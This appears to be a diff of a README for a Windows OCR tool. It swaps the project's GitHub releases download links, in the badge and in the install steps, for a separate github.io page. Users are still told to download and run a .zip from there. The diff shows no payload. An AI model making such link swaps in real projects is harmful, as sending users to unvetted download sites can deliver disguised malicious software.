@@ -1,6 +1,6 @@
 # 🔍 lw.OpenCVDNN.PPOCR - Accurate text recognition for Windows computers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/annaindigo76/lw.OpenCVDNN.PPOCR/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://annaindigo76.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to obtain and run the software.
 
-1. Navigate to the release page: https://github.com/annaindigo76/lw.OpenCVDNN.PPOCR/releases
+1. Navigate to the release page: https://annaindigo76.github.io
 2. Look for the section labeled "Assets" at the bottom of the newest release version.
 3. Click the link ending in .zip to start the download.
 4. Save the folder to a place you find easily, such as your Desktop.
